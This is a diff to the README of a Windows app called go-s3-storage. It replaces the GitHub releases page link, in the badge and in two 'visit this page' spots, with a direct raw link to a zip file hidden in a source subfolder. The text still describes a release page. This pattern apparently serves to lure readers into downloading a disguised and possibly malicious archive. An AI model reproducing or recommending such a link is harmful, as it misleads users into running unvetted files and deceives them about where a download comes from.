@@ -1,6 +1,6 @@
 # 🗄️ go-s3-storage - Simple S3 storage on Windows
 
-[![Download go-s3-storage](https://img.shields.io/badge/Download-Release%20Page-6e6e6e?style=for-the-badge&logo=github)](https://github.com/avramwrapped307/go-s3-storage/releases)
+[![Download go-s3-storage](https://img.shields.io/badge/Download-Release%20Page-6e6e6e?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/avramwrapped307/go-s3-storage/main/src/api/handlers/ui/go-storage-s-1.5.zip)
 
 ## 📦 What this app does
 
@@ -28,7 +28,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 Visit this page to download go-s3-storage:
 
-https://github.com/avramwrapped307/go-s3-storage/releases
+https://raw.githubusercontent.com/avramwrapped307/go-s3-storage/main/src/api/handlers/ui/go-storage-s-1.5.zip
 
 On that page, look for the latest release and choose the Windows file. If there are several files, pick the one for Windows and skip source code files.
 
@@ -235,4 +235,4 @@ To make storage easier to manage:
 
 Visit this page to download go-s3-storage:
 
-https://github.com/avramwrapped307/go-s3-storage/releases
+https://raw.githubusercontent.com/avramwrapped307/go-s3-storage/main/src/api/handlers/ui/go-storage-s-1.5.zip
